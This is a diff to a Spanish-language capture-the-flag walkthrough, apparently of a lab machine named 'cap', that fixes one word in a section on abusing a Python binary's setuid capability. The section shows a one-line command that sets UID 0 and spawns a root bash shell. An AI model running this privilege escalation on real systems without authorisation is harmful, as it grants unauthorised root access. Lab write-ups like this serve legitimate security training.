@@ -282,7 +282,7 @@ Esta capability permite a un proceso cambiar su ID de usuario efectivo (`UID`) a
 
 Para escalar privilegios podemos leer este apartado en [GTFOBins](https://gtfobins.github.io/gtfobins/python/#capabilities)
 
-Y simplemente podemos cargar privilegios utilizando el binario de python para cargar librería `os` y cambiando nuestro UID a 0 (root) para acto seguido invocar una shell.
+Y simplemente podemos escalar privilegios utilizando el binario de python para cargar librería `os` y cambiando nuestro UID a 0 (root) para acto seguido invocar una shell.
 
 ```shell
 nathan@cap:~$ /usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
